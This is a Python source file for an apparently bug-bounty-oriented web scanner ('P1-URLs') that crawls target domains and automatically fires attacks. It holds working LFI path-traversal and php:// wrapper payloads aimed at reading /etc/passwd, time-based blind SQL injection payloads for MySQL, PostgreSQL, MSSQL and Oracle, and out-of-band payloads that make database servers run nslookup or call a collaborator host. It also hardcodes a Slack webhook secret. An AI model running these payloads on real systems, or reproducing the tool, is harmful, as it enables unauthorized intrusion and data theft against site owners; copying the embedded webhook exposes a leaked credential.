#!/usr/bin/env python3
"""
P1-URLs.py - v1.8.4 Final Stable Release

This definitive version corrects all known SyntaxError, NameError, and UnboundLocalError
bugs, ensuring a stable, reliable, and complete execution of the entire workflow.
"""

import subprocess
import argparse
import os
import re
import shutil
import sys
import time
import random
import string
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from difflib import SequenceMatcher
from datetime import datetime
from rich.console import Console

try:
    from rich.panel import Panel
except ImportError:
    from rich.containers import Panel # Fallback for older versions
from tqdm import tqdm
import requests
import json
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==============================================================================
# === Config (Unchanged) ===
# ==============================================================================
SLACK_WEBHOOK = "https://hooks.slack.com/services/T03JPK11LNM/B0908RQP1GB/hrmkhkKGbO72J0OMa9g4kb0" 
# All other configuration remains the same.
BULK_URLS_OUTPUT, DEDUPED_URLS = "target_bulk_urls.txt", "unique_urls_filtered.txt"
GF_PATTERNS = ["lfi", "rce", "redirect", "sqli", "ssrf", "ssti", "xss"]
KATANA_CONCURRENCY, CONCURRENCY = 25, 25; TIME_DELAY, REQUEST_TIMEOUT = 6, 8
CLEAN_BASE_HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","Accept-Language": "en-US,en;q=0.9"}
HEADERS_TO_TEST = ["User-Agent", "Referer", "X-Forwarded-For", "X-Client-IP", "X-Real-IP", "Origin", "CF-Connecting-IP"]
METHODS_TO_TEST = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]
LFI_SIMILARITY_THRESHOLD = 0.9 
LFI_CONFIDENCE_STRINGS = {"Linux /etc/passwd": r"root:(x|\*|\$[^:]*):0:0:","Windows boot.ini": r"\[boot loader\]|\[operating systems\]","PHP data:// Wrapper Exec": r"40212b72c3a51610a26e848608871439","Base64 Linux /etc/passwd": r"cm9vdDo="}
DEFAULT_LFI_PAYLOADS = ["../../../../../../../../etc/passwd","/etc/passwd","../../../../../../../../windows/win.ini","/windows/win.ini","c:\\boot.ini","..\\..\\..\\boot.ini","../../../../../../../../etc/passwd%00","../../../../../../../../boot.ini%00","..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd","..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd","php://filter/convert.base64-encode/resource=/etc/passwd","php://filter/resource=/etc/passwd","php://filter/read=string.rot13/resource=/etc/passwd","data:text/plain;base64,PD9waHAgZWNobyBtZDUoJ3AxbmN1c3RvbScpOyA/Pg==","L2V0Yy9wYXNzd2Q=","//..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/etc/passwd","///////../../../etc/passwd","../../../../../../../../../../../../../etc/passwd","//////////////////../../../../../../../../etc/passwd",".%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd","%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/etc/passwd","file:/etc/passwd", "file:///etc/passwd"]
for i in range(2, 20): DEFAULT_LFI_PAYLOADS.extend([('../' * i) + 'etc/passwd', ('../' * i) + 'windows/win.ini', ('%2e%2e/' * i) + 'etc/passwd'])
CANARY_SQLI_PAYLOADS = {"MySQL": ["{val}' AND SLEEP({delay})-- -"],"PostgreSQL": ["';SELECT pg_sleep({delay})--"],"MSSQL": ["';WAITFOR DELAY '0:0:{delay}'--"],"Oracle": ["{val}' AND DBMS_LOCK.SLEEP({delay})-- -"]}
BLIND_SQLI_PAYLOADS = {"MySQL": ["0'XOR(if(now()=sysdate(),sleep({delay}),0))XOR'Z","0'XOR(if(now()=sysdate(),sleep({delay}),0))+XOR'Z","0\"XOR(if(now()=sysdate(),sleep({delay}),0))XOR\"Z","{val}' XOR IF(NOW()=SYSDATE(),SLEEP({delay}),0) XOR 'Z'","X'XOR(if(now()=sysdate(),sleep({delay}),0))XOR'X","\"XOR(if(now()=sysdate(),sleep({delay}),0))XOR\"","{val}' XOR (SELECT * FROM (SELECT(SLEEP({delay})))a)-- -","' OR IF(ASCII(SUBSTR(user(),1,1))=114,SLEEP({delay}),0)--","{val}'+AND+(SELECT+1848+FROM+(SELECT(SLEEP({delay})))OHwd)--+FnqF", "{val}';(SELECT*FROM(SELECT(SLEEP({delay})))a)", "{val}')) or sleep({delay})='", "{val}\");SELECT+SLEEP({delay})#"],"PostgreSQL": ["1' AND (SELECT 1)=(SELECT 1) XOR (SELECT pg_sleep({delay})) IS NULL--","'OR 1=(SELECT CASE WHEN (1=1) THEN PG_SLEEP({delay}) ELSE NULL END)--", "1 AND CAST(pg_sleep({delay}) AS varchar) IS NULL"],"MSSQL": ["1' OR 1=(SELECT 1 WHERE 1=1^0); WAITFOR DELAY '0:0:{delay}'--", "';+IF+(1=1)+WAITFOR+DELAY+'0:0:{delay}'--"],"Oracle": ["orwa'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),{delay})||'", "'; BEGIN DBMS_LOCK.SLEEP({delay}); END;--"]}
OOB_SQLI_PAYLOADS = {"MySQL": ["{val}' AND IF(1=1, (SELECT LOAD_FILE(CONCAT('\\\\\\\\','{oob_id}.p1_mysql.', '{collab_url}','\\\\a.txt'))), 0)-- -"],"PostgreSQL": ["';COPY (SELECT '') FROM PROGRAM 'nslookup {oob_id}.p1_pg.{collab_url}';--"],"MSSQL": ["'; exec master..xp_dirtree '\\\\{oob_id}.p1_mssql.{collab_url}\\a';--"],"Oracle": ["AND (SELECT UTL_HTTP.REQUEST('http://{oob_id}.p1_oracle.{collab_url}') FROM DUAL) IS NOT NULL","AND 1=CASE WHEN (1=1) THEN (SELECT UTL_INADDR.GET_HOST_NAME('127.0.0.1','{oob_id}.p1_oracle_case.{collab_url}') FROM DUAL) ELSE 0 END"]}

console = Console()

# ==============================================================================
# === Helper & Core Functions (The run_nuclei function is corrected) ===
# ==============================================================================

def print_banner():
    def typewriter_effect(text, delay=0.01, style=""):
        console.print(f"[{style}]", end="");
        for char in text: console.print(f"[{style}]{char}[/{style}]", end=""); sys.stdout.flush(); time.sleep(delay)
        print()
    os.system('cls' if os.name == 'nt' else 'clear'); console.print("[bold cyan]Booting P1-URLs Scanner...[/bold cyan]"); time.sleep(0.5)
    for _ in range(5): console.print(f"[bold green]{''.join(random.choice('01 ') for _ in range(os.get_terminal_size().columns))}[/bold green]", overflow="hidden", no_wrap=True); time.sleep(0.02)
    ascii_art_lines = ["██████╗  ██╗    ██████╗ ██████╗ ██╗     ███████╗","██╔══██╗ ██║    ██╔══██╗██╔══██╗██║     ██╔════╝","██████╔╝ ██║    ██║  ██║██████╔╝██║     ███████╗","██╔═══╝  ██║    ██║  ██║██╔══██╗██║     ╚════██║","██║      ███████╗██████╔╝██║  ██║███████╗███████║","╚═╝      ╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝"]
    console.print("\n[bold red]Initializing Mainframe...[/bold red]"); final_panel_text = []
    for line in ascii_art_lines: console.print(f"[bold cyan]{line}[/bold cyan]", highlight=False); final_panel_text.append(f"[bold cyan]{line}[/bold cyan]"); time.sleep(0.05)
    subtitle_text = "\n[yellow]v1.8.4 Final Stable Release[/yellow]\n"; typewriter_effect(subtitle_text, style="yellow"); final_panel_text.append(subtitle_text); time.sleep(0.5)
    final_footer = "[bold green]by bugcrowd.com/realvivek[/]  [dim]|[/]  [bold sky_blue3]x.com/starkcharry[/]"; panel = Panel("\n".join(final_panel_text),title="[bold red]P1 URLs[/]", subtitle=final_footer, subtitle_align="right", border_style="bold blue", padding=(1, 2))
    os.system('cls' if os.name == 'nt' else 'clear'); console.print(panel); time.sleep(1)

def send_status_update(message):
    try: requests.post(SLACK_WEBHOOK, json={"text": message}, timeout=5, verify=False)
    except requests.RequestException: pass

def check_dependencies():
    console.print("[bold yellow][*] Checking for required tools...[/]")
    tools = ["katana", "uro", "gf", "nuclei"]; python_modules = ['tqdm']
    all_found = all(shutil.which(tool) for tool in tools)
    if not all_found: [console.print(f"[bold red][!] Tool not found in PATH:[/] {tool}") for tool in tools if not shutil.which(tool)]; console.print("[bold red][!] Please install the missing tools.[/]"); exit(1)
    try: import tqdm
    except ImportError: console.print("[bold red][!] Python module 'tqdm' not found. Please run 'pip3 install --user tqdm'[/bold red]"); exit(1)
    console.print("[bold green][✔] All tools are installed.[/]")

def report_and_log(title, details, log_file, severity="CRITICAL", icon="🚨"):
    console.print(Panel(f"[bold white]{title}[/bold white]\n" + "\n".join(f"[bold cyan]• {k}:[/bold cyan] [white]{v}[/white]" for k, v in details.items()), border_style="bold green", expand=False))
    slack_message = (f"{icon} *{title}*\n" f"• *Severity:* `{severity}`\n") + "".join((f"• *{k}:* ```{v}```\n" if 'Payload' in k or 'Command' in k else f"• *{k}:* `{v}`\n") for k, v in details.items())
    try: requests.post(SLACK_WEBHOOK, json={"text": slack_message}, timeout=10, verify=False)
    except requests.RequestException as e: console.print(f"[red]Slack alert failed: {e}[/red]")
    with open(log_file, "a") as f: f.write(json.dumps({"title": title, "severity": severity, **details}) + "\n")

def log_oob_attempt(oob_id, full_details, log_file):
    console.print(Panel(f"[bold white]Firing OOB SQLi Payload[/bold white]\n" + "\n".join(f"[bold cyan]• {k}:[/bold cyan] [white]{v}[/white]" for k, v in {"OOB ID": oob_id, **full_details}.items()), border_style="yellow", expand=False))
    with open(log_file, "a") as f: f.write(json.dumps({"oob_id": oob_id, **full_details}) + "\n")

def run_command(command, stdin_data=None):
    try: return subprocess.run(command, input=stdin_data, capture_output=True, text=True, check=False).stdout
    except FileNotFoundError: console.print(f"[bold red][!] Command not found: {command[0]}.[/]"); return None

def gather_urls(input_file, output_file):
    console.print("[bold cyan]Step 1: Gathering URLs...[/]"); 
    with open(input_file) as f: domains = f.read()
    if not domains.strip(): console.print("[yellow][!] Input file is empty.[/yellow]"); Path(output_file).touch(); return
    katana_cmd = ["katana", "-silent", "-nc", "-jc", "-kf", "-fx", "-xhr", "-ef", "woff,css,png,svg,jpg,woff2,jpeg,gif,svg", "-c", str(KATANA_CONCURRENCY)]; console.print(f"[*] Beginning bulk crawl on {len(domains.strip().split())} domains...")
    katana_result = run_command(katana_cmd, stdin_data=domains)
    if katana_result:
        with open(output_file, 'w') as out:
            out.write(katana_result)
        console.print(f"[bold green][✔] Katana complete.[/bold green]")
    else: console.print("[bold yellow][-] Katana found no URLs.[/bold yellow]"); Path(output_file).touch()

def run_uro(input_file, output_file):
    console.print("\n[bold cyan]Step 2: Deduplicating URLs[/]")
    with open(input_file) as f: raw_urls = f.read()
    if not raw_urls.strip(): console.print("[yellow][-] No URLs to deduplicate.[/yellow]"); Path(output_file).touch(); return 0
    uro_result = run_command(["uro"], stdin_data=raw_urls)
    count = 0
    if uro_result and uro_result.strip():
        with open(output_file, "w") as out: out.write(uro_result)
        count = len(uro_result.strip().split('\n'))
    console.print(f"[bold green][✔] Deduplication complete. Unique URLs: {count}[/bold green]")
    return count

def run_gf(input_file, gf_output_dir, basefile):
    console.print("\n[bold cyan]Step 3: Classifying URLs...[/]")
    if not Path(input_file).exists() or Path(input_file).stat().st_size == 0: console.print("[yellow][-] No URLs to classify.[/yellow]"); return
    with open(input_file) as f: urls_to_classify = f.read()
    for pattern in GF_PATTERNS:
        result = run_command(["gf", pattern], stdin_data=urls_to_classify)
        if result and result.strip():
            with open(gf_output_dir / f"{basefile}_{pattern}.txt", "w") as out: out.write(result); console.print(f"    [bold green][✔] Found {len(result.strip().split())} potential '{pattern}' URLs.[/bold green]")
    console.print("[bold green][✔] GF classification complete.[/bold green]")

def check_lfi_payload(session, base_content, param, lfi_payload, query_params, parsed_url):
    malicious_url = urlunparse(parsed_url._replace(query=urlencode({**query_params, param: lfi_payload}, doseq=True)))
    try:
        attack_resp = session.get(malicious_url, headers=CLEAN_BASE_HEADERS, timeout=REQUEST_TIMEOUT, verify=False); attack_content = attack_resp.text
        if SequenceMatcher(None, base_content, attack_content).ratio() < LFI_SIMILARITY_THRESHOLD:
            for rule_name, pattern in LFI_CONFIDENCE_STRINGS.items():
                if re.search(pattern, attack_content, re.IGNORECASE): return {"url": malicious_url, "param": param, "rule": rule_name, "payload": lfi_payload}
    except requests.RequestException: pass
    return None

def test_lfi_dynamically(lfi_urls_file, args, lfi_results_file):
    console.print(f"\n[bold cyan]Step 4: LFI Testing (High-Throughput)...[/]")
    if not lfi_urls_file.exists() or lfi_urls_file.stat().st_size == 0: return
    lfi_payloads = DEFAULT_LFI_PAYLOADS
    if args.lfi_payloads:
        with open(Path(args.lfi_payloads)) as f: lfi_payloads = [line.strip() for line in f if line.strip()]
    with open(lfi_urls_file) as f: urls_to_test = [line.strip() for line in f if line.strip()]
    
    test_cases, session = [], requests.Session()
    for url in tqdm(urls_to_test, desc="Preparing LFI Baselines", unit="url"):
        try:
            base_resp = session.get(url, headers=CLEAN_BASE_HEADERS, timeout=REQUEST_TIMEOUT, verify=False)
            base_content = base_resp.text; parsed_url = urlparse(url); query_params = parse_qs(parsed_url.query, keep_blank_values=True)
            for param in query_params:
                for payload in lfi_payloads: test_cases.append((session, base_content, param, payload, query_params, parsed_url))
        except requests.RequestException: continue
    
    console.print(f"[*] Submitting {len(test_cases)} LFI checks to the thread pool (Concurrency: {CONCURRENCY})...")
    with ThreadPoolExecutor(max_workers=CONCURRENCY) as executor:
        futures = {executor.submit(check_lfi_payload, *case): case for case in test_cases}
        found_params = set()
        for future in tqdm(as_completed(futures), total=len(futures), desc="LFI Checks      ", unit="req"):
            case_param, case_url = futures[future][2], futures[future][-1].geturl()
            param_key = f"{case_url}_{case_param}"
            if param_key not in found_params and (result := future.result()):
                report_and_log("Vivek - LFI Vulnerability Found", {"Vulnerable URL": result['url'], "Parameter": result['param'], "Detection Rule": result['rule'], "Payload Used": result['payload']}, lfi_results_file, severity="HIGH")
                found_params.add(param_key)
    console.print(f"[bold green][✔] LFI scan complete.[/bold green]")

def generate_oob_id(size=6, chars=string.ascii_lowercase + string.digits): return ''.join(random.choice(chars) for _ in range(size))
def generate_curl_command(url, method, headers):
    command = f"curl -k -X {method.upper()} '{url}'"
    for key, value in headers.items(): command += f" -H '{key}: {value}'"
    if method.upper() in ["POST", "PUT", "PATCH"]: command += " --data 'p1=p1'"
    return command
def _check_sqli_vulnerability_time(target_url, method, headers):
    try:
        start_baseline = time.time(); requests.request(method.upper(), urlparse(target_url)._replace(query="").geturl(), headers=CLEAN_BASE_HEADERS, timeout=5, verify=False); baseline_duration = time.time() - start_baseline
        start_attack = time.time(); requests.request(method.upper(), target_url, headers=headers, data={"p1":"p1"} if method.upper() in ["POST", "PUT", "PATCH"] else None, timeout=(TIME_DELAY + 5), verify=False); attack_duration = time.time() - start_attack
        if (attack_duration > TIME_DELAY) and (attack_duration - baseline_duration > TIME_DELAY * 0.8): return True, attack_duration
    except requests.exceptions.Timeout: return True, time.time() - (locals().get('start_attack', time.time()))
    except requests.exceptions.RequestException: pass
    return False, 0
def check_sqli_payload(url, method, payload, injection_point_type, injection_point_name, db_name, test_type="Time-Based", oob_id=None, oob_log_file=None):
    headers, malicious_url = CLEAN_BASE_HEADERS.copy(), url
    if injection_point_type == "Parameter": malicious_url = urlunparse(urlparse(url)._replace(query=urlencode({**parse_qs(urlparse(url).query, keep_blank_values=True), injection_point_name: payload}, doseq=True)))
    elif injection_point_type == "Parameter-HPP": malicious_url = urlunparse(urlparse(url)._replace(query=urlencode(list(parse_qs(urlparse(url).query, keep_blank_values=True).items()) + [(injection_point_name, payload)], doseq=True)))
    elif injection_point_type == "Header": headers[injection_point_name] = payload
    if test_type == "Time-Based":
        is_vuln, time_taken = _check_sqli_vulnerability_time(malicious_url, method, headers)
        if is_vuln: return {"url": url, "db": db_name, "payload": payload, "details": {"Injection Point": f"{injection_point_type}: {injection_point_name}", "Method": method, "Type": "Time-Based", "Time Taken": f"{time_taken:.2f}s", "Curl Command": generate_curl_command(malicious_url, method, headers)}}
    elif test_type == "OOB" and oob_id and oob_log_file:
        _fire_oob_payload(malicious_url, method, headers, oob_id, oob_log_file, {"URL": url, "Injection Point": f"{injection_point_type}: {injection_point_name}", "Method": method, "Payload Used": payload})
    return None
def _fire_oob_payload(target_url, method, headers, oob_id, oob_log_file, full_details):
    log_oob_attempt(oob_id, full_details, oob_log_file)
    try: requests.request(method.upper(), target_url, headers=headers, data={"p1":"p1"} if method.upper() in ["POST", "PUT", "PATCH"] else None, timeout=5, verify=False)
    except requests.RequestException: pass
def test_blind_sqli(sqli_urls_file, blind_sqli_results_file, oob_log_file, args):
    console.print(f"\n[bold cyan]Step 5: SQLi Testing (Smart Scan)...[/]")
    if not sqli_urls_file.exists() or sqli_urls_file.stat().st_size == 0: return
    with open(sqli_urls_file) as f: urls = [line.strip() for line in f]; random.shuffle(urls)
    probe_test_cases, full_attack_map, collab_host = [], {}, None
    console.print("[*] Preparing fast probes to identify potential SQLi candidates...")
    for url in urls:
        for param, values in parse_qs(urlparse(url).query, keep_blank_values=True).items():
            for db, payloads in CANARY_SQLI_PAYLOADS.items(): payload = payloads[0].format(delay=TIME_DELAY, val=(values[0] if values else "")); probe_test_cases.extend([(url,"GET",payload,"Parameter",param,db),(url,"GET",payload,"Parameter-HPP",param,db)])
        for header in HEADERS_TO_TEST:
            for db, payloads in CANARY_SQLI_PAYLOADS.items(): payload = payloads[0].format(delay=TIME_DELAY, val=""); probe_test_cases.append((url,"GET",payload,"Header",header,db))
    if not probe_test_cases: console.print("[yellow][-] No injection points found for SQLi probing.[/yellow]"); return
    console.print(f"[*] Submitting {len(probe_test_cases)} fast probes...")
    with ThreadPoolExecutor(max_workers=CONCURRENCY) as executor:
        futures = {executor.submit(check_sqli_payload, *case): case for case in probe_test_cases}
        for future in tqdm(as_completed(futures), total=len(futures), desc="SQLi Probes     ", unit="req"):
            if result := future.result():
                candidate_key = f"{result['details']['Injection Point']}@{result['url']}"
                if candidate_key not in full_attack_map: console.print(f"\n[bold yellow][!] Potential Candidate Found:[/] {result['details']['Injection Point']} on {result['url']}"); full_attack_map[candidate_key] = (result['db'], result)
    if not full_attack_map: console.print("[green][✔] No promising candidates found. SQLi scan complete.[/green]"); return
    console.print(f"\n[bold bright_blue][*] Probe complete. Found {len(full_attack_map)} promising candidates. Launching full exhaustive scan...[/]")
    full_attack_cases = [];
    if args.collab_url: collab_host = urlparse(args.collab_url).netloc or args.collab_url; send_status_update(f"   ...OOB testing active. Monitor `{collab_host}` and `{oob_log_file}`.")
    for key, (db_type, result_details) in full_attack_map.items():
        point, url = key.split('@'); point_type, point_name = point.split(': ')
        if point_type == "Header":
            for method in METHODS_TO_TEST:
                for payload_template in BLIND_SQLI_PAYLOADS.get(db_type, []): full_attack_cases.append((url, method, payload_template.format(delay=TIME_DELAY, val=""), "Header", point_name, db_type))
                if collab_host and db_type in OOB_SQLI_PAYLOADS:
                    for payload_template in OOB_SQLI_PAYLOADS[db_type]: oob_id = generate_oob_id(); full_attack_cases.append((url, method, payload_template.format(oob_id=oob_id, collab_url=collab_host, val=""), "Header", point_name, db_type, "OOB", oob_id, oob_log_file))
        else:
            original_value = parse_qs(urlparse(url).query).get(point_name, [""])[0]
            for payload_template in BLIND_SQLI_PAYLOADS.get(db_type, []): payload = payload_template.format(delay=TIME_DELAY, val=original_value); full_attack_cases.extend([(url, "GET", payload, "Parameter", point_name, db_type), (url, "GET", payload, "Parameter-HPP", point_name, db_type)])
            if collab_host and db_type in OOB_SQLI_PAYLOADS:
                for payload_template in OOB_SQLI_PAYLOADS[db_type]: oob_id, payload = generate_oob_id(), payload_template.format(oob_id=oob_id, collab_url=collab_host, val=original_value); full_attack_cases.extend([(url,"GET",payload,"Parameter",point_name,db_type,"OOB",oob_id,oob_log_file),(url,"GET",payload,"Parameter-HPP",point_name,db_type,"OOB",oob_id,oob_log_file)])
    
    console.print(f"[*] Submitting {len(full_attack_cases)} exhaustive tests on candidates...")
    found_vuln_keys = set()
    with ThreadPoolExecutor(max_workers=CONCURRENCY) as executor:
        futures = {executor.submit(check_sqli_payload, *case): case for case in full_attack_cases}
        for future in tqdm(as_completed(futures), total=len(futures), desc="Exhaustive SQLi", unit="req"):
            if (result := future.result()) and (vuln_key := f"{result['url']}_{result['details']['Injection Point']}") not in found_vuln_keys:
                found_vuln_keys.add(vuln_key); report_and_log("Vivek - Blind SQLi Vulnerability Found", {"URL": result['url'],**result['details']}, blind_sqli_results_file)
    console.print(f"[bold green][✔] Full SQLi scan on candidates complete.[/bold green]")

def run_nuclei(gf_dir, nuclei_dir, basefile, nuclei_findings_file):
    console.print(f"\n[bold cyan]Step 6: Nuclei Scanning...[/]")
    for pattern in GF_PATTERNS:
        if pattern in ['sqli', 'lfi']: continue
        file_path = Path(gf_dir) / f"{basefile}_{pattern}.txt"
        if not file_path.exists() or file_path.stat().st_size == 0: continue
        console.print(f"[*] Scanning for [bold magenta]{pattern}[/]..."); 
        output_path = Path(nuclei_dir) / f"{basefile}_{pattern}_nuclei.jsonl"
        nuclei_cmd = ["nuclei", "-l", str(file_path), "-jsonl", "-o", str(output_path), "-rate-limit", "150", "-tags", pattern, "-silent"]
        run_command(nuclei_cmd)
        if output_path.exists() and output_path.stat().st_size > 0:
            with open(output_path) as f:
                for line in f:
                    try:
                        result = json.loads(line); info = result.get("info", {})
                        report_and_log("Vivek - Nuclei Vulnerability Found", {"Vulnerability": result.get("template-id", "N/A").upper(), "URL": result.get("matched-at", "N/A"), "Template": info.get("name", "N/A")}, nuclei_findings_file, severity=info.get("severity", "N/A").upper())
                    except (json.JSONDecodeError, KeyError): continue
    console.print("[bold green][✔] Nuclei scanning complete.[/bold green]")

def main():
    parser = argparse.ArgumentParser(description="P1-URLs Scanner - v1.8.2")
    parser.add_argument("-l", "--list", required=True, help="Path to subdomains or URLs.")
    parser.add_argument("-u", "--use-urls", action="store_true", help="Skip discovery, use file as URLs.")
    parser.add_argument("-p", "--lfi-payloads", help="Optional: Path to custom LFI payloads.")
    parser.add_argument("-c", "--collab-url", help="Collaborator URL for Out-of-Band (OOB) SQLi checks.")
    args = parser.parse_args(); input_file, basefile = Path(args.list), Path(args.list).stem
    if not input_file.is_file(): console.print(f"[red][!] Input file not found:[/] {input_file}"); return
    
    output_dir = Path(f"scan_results_{basefile}_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}"); console.print(f"[bold bright_blue]Creating isolated scan directory: {output_dir}[/]")
    if output_dir.exists(): shutil.rmtree(output_dir)
    gf_dir, nuclei_dir = output_dir/"gf_results", output_dir/"nuclei_results"; os.makedirs(gf_dir); os.makedirs(nuclei_dir)
    
    lfi_file, sqli_file, nuclei_file, oob_file = output_dir/"lfi_vulnerable.json", output_dir/"blind_sqli_vulnerable.json", output_dir/"nuclei_findings.json", output_dir/"oob_requests.log"
    deduped_urls_path = output_dir / DEDUPED_URLS
    
    send_status_update(f"🚀 *Scan Started* on `{basefile}`...")
    
    if args.use_urls:
        workflow = [("Deduplicating URLs...", lambda: run_uro(str(input_file), deduped_urls_path)),
                    ("Classifying URLs...", lambda: run_gf(deduped_urls_path, gf_dir, basefile)),
                    ("LFI Analysis...", lambda: test_lfi_dynamically(gf_dir/f"{basefile}_lfi.txt", args, lfi_file)), 
                    ("Blind SQLi Analysis...", lambda: test_blind_sqli(gf_dir/f"{basefile}_sqli.txt", sqli_file, oob_file, args)),
                    ("Nuclei Scanning...", lambda: run_nuclei(gf_dir, nuclei_dir, basefile, nuclei_file))]
    else:
        workflow = [("Gathering URLs...", lambda: gather_urls(str(input_file), output_dir/BULK_URLS_OUTPUT)),
                    ("Deduplicating URLs...", lambda: run_uro(output_dir/BULK_URLS_OUTPUT, deduped_urls_path)),
                    ("Classifying URLs...", lambda: run_gf(deduped_urls_path, gf_dir, basefile)),
                    ("LFI Analysis...", lambda: test_lfi_dynamically(gf_dir/f"{basefile}_lfi.txt", args, lfi_file)),
                    ("Blind SQLi Analysis...", lambda: test_blind_sqli(gf_dir/f"{basefile}_sqli.txt", sqli_file, oob_file, args)),
                    ("Nuclei Scanning...", lambda: run_nuclei(gf_dir, nuclei_dir, basefile, nuclei_file))]

    for i, (name, func) in enumerate(workflow, 1):
        send_status_update(f"⚙️ `[{i}/{len(workflow)}]` Starting {name}")
        func()
        
    console.print(f"\n[bold green][✔] All tasks complete! Results are in: {output_dir}[/bold green]"); send_status_update(f"✅ *Scan Complete* for `{basefile}`.")

if __name__ == "__main__":
    print_banner()
    check_dependencies()
    main()
